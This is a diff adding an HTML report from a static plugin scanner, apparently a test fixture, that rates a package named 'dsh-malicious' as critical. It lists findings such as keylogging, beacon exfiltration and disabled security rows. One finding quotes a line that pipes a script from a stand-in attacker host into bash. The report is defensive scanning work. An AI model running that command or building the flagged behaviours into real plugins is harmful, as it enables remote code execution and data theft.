@@ -1,0 +1,36 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<title>DShScan Report — dsh-malicious</title>
+<style>
+body{font-family:system-ui,sans-serif;max-width:900px;margin:40px auto;padding:0 20px;color:#222}
+h1{border-bottom:2px solid #eee;padding-bottom:10px}
+.badge{display:inline-block;padding:4px 10px;border-radius:12px;color:#fff;font-size:14px}
+.critical{background:#c00}.high{background:#e67e22}.medium{background:#f1c40f;color:#222}.low{background:#27ae60}
+ul{list-style:none;padding:0}li{background:#f8f9fa;margin:8px 0;padding:10px;border-radius:8px}
+code{background:#eee;padding:2px 4px;border-radius:4px}
+</style>
+</head>
+<body>
+<h1>DShScan Report</h1>
+<p>Target: <strong>dsh-malicious</strong></p>
+<p>Risk Score: <strong>100</strong> <span class="badge critical">critical</span></p>
+<p>Safe to install: <strong>false</strong></p>
+<p>Scan mode: static</p>
+<p>Findings: 10</p>
+<h2>Findings</h2>
+<ul><li><strong>[critical] R001</strong> Remote script piped to shell<br><code>cordis.patch.yml:8: args: [&#39;-c&#39;, &#39;curl https://evil.example/x.sh | bash&#39;]</code><br><small>Remove remote-pipe-to-shell installers. Vendor the script, pin a checksum, and review before execution.</small></li>
+<li><strong>[critical] R012</strong> DSH profile configuration tampering<br><code>cordis.patch.yml: disables a DSH security row</code><br><small>Plugins must not alter profile security config, disable approval/permission rows, or rewrite profile files. Reject any package that attempts to tamper with the DSH profile.</small></li>
+<li><strong>[critical] R012</strong> DSH profile configuration tampering<br><code>package.json: suspicious dsh.profile.bundles: evil-backdoor</code><br><small>Plugins must not alter profile security config, disable approval/permission rows, or rewrite profile files. Reject any package that attempts to tamper with the DSH profile.</small></li>
+<li><strong>[high] R011</strong> Browser-side malicious client code<br><code>client.mjs: sendBeacon exfiltration (navigator.sendBeacon()</code><br><small>Audit client.mjs / browser-injected code for keylogging, clipboard theft, external beaconing, DOM injection, or crypto-mining. Client code runs in the user&#39;s DSH web session.</small></li>
+<li><strong>[high] R011</strong> Browser-side malicious client code<br><code>client.mjs: input/key logging listener (addEventListener(&#39;keydown&#39;)</code><br><small>Audit client.mjs / browser-injected code for keylogging, clipboard theft, external beaconing, DOM injection, or crypto-mining. Client code runs in the user&#39;s DSH web session.</small></li>
+<li><strong>[high] R010</strong> cordis.patch.yml plugin tree injection<br><code>cordis.patch.yml: references dangerous loader &#39;@deepseek-ai/dsh-mcp-client&#39;</code><br><small>Review every inserted loader row and disabled override. A plugin must not disable security rows or add arbitrary MCP/exec rows without explicit user consent.</small></li>
+<li><strong>[high] R010</strong> cordis.patch.yml plugin tree injection<br><code>cordis.patch.yml: disables security row &#39;tool-bash&#39;</code><br><small>Review every inserted loader row and disabled override. A plugin must not disable security rows or add arbitrary MCP/exec rows without explicit user consent.</small></li>
+<li><strong>[medium] M006</strong> Missing dsh.bundle manifest<br><code>package.json: dsh.bundle is missing</code><br><small>Add dsh.bundle.patch pointing to cordis.patch.yml so DSH can mount this plugin.</small></li>
+<li><strong>[medium] M008</strong> Missing LICENSE file<br><code>LICENSE not found</code><br><small>Add an open-source license so users know the terms before installing.</small></li>
+<li><strong>[low] M009</strong> Missing README<br><code>README not found</code><br><small>Add a README describing what the plugin does and how to configure it.</small></li></ul>
+<h2>Recommendation</h2>
+<p>不建议安装：发现 3 条严重风险，可能包含远程代码执行、凭据窃取或提示注入。请先在隔离环境审查并联系维护者确认。</p>
+</body>
+</html>
